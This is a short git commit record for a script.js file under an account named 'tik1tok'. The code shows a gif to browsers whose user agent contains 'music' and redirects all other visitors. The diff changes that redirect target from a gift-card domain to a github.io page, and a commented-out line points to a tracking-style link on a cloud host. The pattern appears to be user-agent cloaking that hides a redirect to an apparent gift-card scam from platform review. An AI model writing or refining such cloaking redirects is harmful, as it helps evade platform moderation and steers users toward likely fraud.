c2ad0f57e944a0ee250feeba2267da4de0b84556
tik1tok <jardeinsharon57@gmail.com>
2026-08-03 18:01:26 +0300

    Update script.js

--- script.js
+++ script.js
@@ -12,7 +12,7 @@ if (agent.indexOf('music') >= 0) {
   gif.className = 'block';
   gif_desc.className = 'block';
 } else {
-  window.location = 'https://giftcards4u.site/';
+  window.location = 'https://tik1tok.github.io/1/';
 //   window.open('http://giftcards4u-env.eba-v4knkbmr.eu-west-2.elasticbeanstalk.com/og.php?u=/cl/i/lklqo6', '_blank');
   console.log('go to link');
 
